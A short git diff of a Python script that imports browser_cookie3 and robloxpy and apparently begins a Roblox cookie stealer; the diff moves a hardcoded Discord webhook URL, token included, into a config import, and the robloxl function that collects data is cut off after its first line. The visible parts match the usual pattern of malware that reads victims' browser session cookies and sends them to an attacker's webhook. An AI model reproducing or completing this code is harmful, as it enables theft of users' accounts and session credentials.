@@ -1,8 +1,8 @@
 import requests, robloxpy, json, browser_cookie3, os.path
+from config import hook
 
 user = os.path.expanduser("~")
 
-hook = "https://discord.com/api/webhooks/1073970412322566175/HtYFF6lf77URUMpHJPH-egvs0iOSEsYV6yXuuPmw3QGvXG1A_rJRFYX3z9p6jYcRrjgl"
 
 def robloxl():
     data = [] 
